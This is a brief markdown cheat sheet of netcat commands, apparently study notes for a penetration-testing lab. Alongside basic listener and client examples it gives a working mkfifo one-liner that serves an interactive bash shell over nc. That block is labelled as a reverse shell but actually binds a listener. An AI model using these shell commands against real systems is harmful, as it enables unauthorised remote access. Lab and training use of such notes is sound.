## Netcat Usage

```bash
sudo nc -nv -s PWNIP -p53 STMIP 50000
```

Initiates a Netcat connection from PWNIP on port 53 to STMIP on port 50000.

## Bind Shell (Attacker with Client)

```bash
nc -nv 10.129.41.200 7777
```

### Reverse Shell (Victim with Server)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

---

## Basic TCP connection

### Server

Server open a listening port at 6666

```bash
nc -lvnp 6666
```

### Client

Client connects to the server on port 6666

```bash
nc -nv 10.129.201.134 6666
```
